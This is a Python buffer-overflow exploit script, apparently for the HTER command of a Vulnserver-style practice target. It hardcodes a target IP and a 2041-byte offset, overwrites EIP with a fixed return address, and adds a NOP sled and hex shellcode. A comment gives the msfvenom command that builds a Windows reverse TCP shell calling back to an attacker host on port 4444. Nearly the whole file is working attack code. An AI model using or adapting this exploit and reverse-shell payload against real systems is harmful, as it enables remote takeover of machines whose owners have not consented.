#!/usr/bin/env python3

# Exploit Title: HTER Command Overflow
# Date: 24MAR2020
# Exploit Author: Nino (Poseidon-ng)

from pwn import *
import binascii

# Target information
host = "192.168.1.27"
port = 9999

s = remote(host, port)

# Determining the offset

# pwn cyclic -a "123456789ABCDERF" 4000
#cyclic_pattern = b"111121113111411151116111711181119111A111B111C111D111E111F11221123112411251126112711281129112A112B112C112D112E112F11321133113411351136113711381139113A113B113C113D113E113F11421143114411451146114711481149114A114B114C114D114E114F11521153115411551156115711581159115A115B115C115D115E115F11621163116411651166116711681169116A116B116C116D116E116F11721173117411751176117711781179117A117B117C117D117E117F11821183118411851186118711881189118A118B118C118D118E118F11921193119411951196119711981199119A119B119C119D119E119F11A211A311A411A511A611A711A811A911AA11AB11AC11AD11AE11AF11B211B311B411B511B611B711B811B911BA11BB11BC11BD11BE11BF11C211C311C411C511C611C711C811C911CA11CB11CC11CD11CE11CF11D211D311D411D511D611D711D811D911DA11DB11DC11DD11DE11DF11E211E311E411E511E611E711E811E911EA11EB11EC11ED11EE11EF11F211F311F411F511F611F711F811F911FA11FB11FC11FD11FE11FF121213121412151216121712181219121A121B121C121D121E121F12221223122412251226122712281229122A122B122C122D122E122F12321233123412351236123712381239123A123B123C123D123E123F12421243124412451246124712481249124A124B124C124D124E124F12521253125412551256125712581259125A125B125C125D125E125F12621263126412651266126712681269126A126B126C126D126E126F12721273127412751276127712781279127A127B127C127D127E127F12821283128412851286128712881289128A128B128C128D128E128F12921293129412951296129712981299129A129B129C129D129E129F12A212A312A412A512A612A712A812A912AA12AB12AC12AD12AE12AF12B212B312B412B512B612B712B812B912BA12BB12BC12BD12BE12BF12C212C312C412C512C612C712C812C912CA12CB12CC12CD12CE12CF12D212D312D412D512D612D712D812D912DA12DB12DC12DD12DE12DF12E212E312E412E512E612E712E812E912EA12EB12EC12ED12EE12EF12F212F312F412F512F612F712F812F912FA12FB12FC12FD12FE12FF13131413151316131713181319131A131B131C131D131E131F13221323132413251326132713281329132A132B132C132D132E132F13321333133413351336133713381339133A133B133C133D133E133F13421343134413451346134713481349134A134B134C134D134E134F13521353135413551356135713581359135A135B135C135D135E135F13621363136413651366136713681369136A136B136C136D136E136F13721373137413751376137713781379137A137B137C137D137E137F13821383138413851386138713881389138A138B138C138D138E138F13921393139413951396139713981399139A139B139C139D139E139F13A213A313A413A513A613A713A813A913AA13AB13AC13AD13AE13AF13B213B313B413B513B613B713B813B913BA13BB13BC13BD13BE13BF13C213C313C413C513C613C713C813C913CA13CB13CC13CD13CE13CF13D213D313D413D513D613D713D813D913DA13DB13DC13DD13DE13DF13E213E313E413E513E613E713E813E913EA13EB13EC13ED13EE13EF13F213F313F413F513F613F713F813F913FA13FB13FC13FD13FE13FF1414151416141714181419141A141B141C141D141E141F14221423142414251426142714281429142A142B142C142D142E142F14321433143414351436143714381439143A143B143C143D143E143F14421443144414451446144714481449144A144B144C144D144E144F14521453145414551456145714581459145A145B145C145D145E145F14621463146414651466146714681469146A146B146C146D146E146F14721473147414751476147714781479147A147B147C147D147E147F14821483148414851486148714881489148A148B148C148D148E148F14921493149414951496149714981499149A149B149C149D149E149F14A214A314A414A514A614A714A814A914AA14AB14AC14AD14AE14AF14B214B314B414B514B614B714B814B914BA14BB14BC14BD14BE14BF14C214C314C414C514C614C714C814C914CA14CB14CC14CD14CE14CF14D214D314D414D514D614D714D814D914DA14DB14DC14DD14DE14DF14E214E314E414E514E614E714E814E914EA14EB14EC14ED14EE14EF14F214F314F414F514F614F714F814F914FA14FB14FC14FD14FE14FF151516151715181519151A151B151C151D151E151F15221523152415251526152715281529152A152B152C152D152E152F15321533153415351536153715381539153A153B153C153D153E153F15421543154415451546154715481549154A154B154C154D154E154F15521553155415551556155715581559155A155B155C155D155E155F15621563156415651566156715681569156A156B156C156D156E156F15721573157415751576157715781579157A157B157C157D157E157F15821583158415851586158715881589158A158B158C158D158E158F15921593159415951596159715981599159A159B159C159D159E159F15A215A315A415A515A615A715A815A915AA15AB15AC15AD15AE15AF15B215B315B415B515B615B715B815B915BA15BB15BC15BD15BE15BF15C215C315C415C515C615C715C815C915CA15CB15CC15CD15CE15C"

# pwn cyclic -a "123456789ABCDEF" -l 7A13
offset = 2041
total_length = 4000

# Variables used
command_prefix = b"HTER "
#new_eip = b"BBBBBBBB"
new_eip = binascii.hexlify(p32(0x625011AF))
nop_sled = b"90"*100

# How I generated my shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.29 LPORT=4444 -f hex -b "\x00" 
shellcode = b"dac4d97424f4ba95a8f5075b31c9b15283c30431531303c6bb17f2145355fde4a43a7701957ae342864a67062b2025b2b844e2b509e2d4f88a5f249b08a2797b306d8c7a75907d2e2eded0de5baae855173a698ae03d581d7a647a9caf1c3386ac198d3d06d50c975616a2d656e5ba1f5016c969a2abcaaed8775e347af3f8907ad09f53709dd43b95203830a1a9bf9623e99b326fa98263d51cba73b6c11ef85b1513a333da1e5bc4742828f6db82a6ba940c31bc8ee9ad43310ae487655a9e2e06315eced3960e608c56fec07c3f14cfa35f1705cccae2ce33a2ed13dcb1ed3a403f0b56686984cf11305e71ddee1bb1551ddc7c9e68cee96e27acbc719dd823e37a182d18d54f7aee2c059649873b6b0fe0ffb0eceffe3548d410805150445c040e321afee0ecf4adaa78809d6cfe8dcb1a1e3fa25a21f0226b5aecd294b1b4e3de9b9d6b874e9cf138a5e30fbb4f9ceba33a99b063d7d3a901d740c903"

# Payload
payload = b"".join([
    command_prefix,
    b'A'*offset,
    new_eip,
    nop_sled,
    shellcode,
    b'C' *( total_length - len(command_prefix) - offset - len(new_eip) - len(nop_sled) - len(shellcode) )

])

# Sending Payload
s.send(payload)
s.interactive()
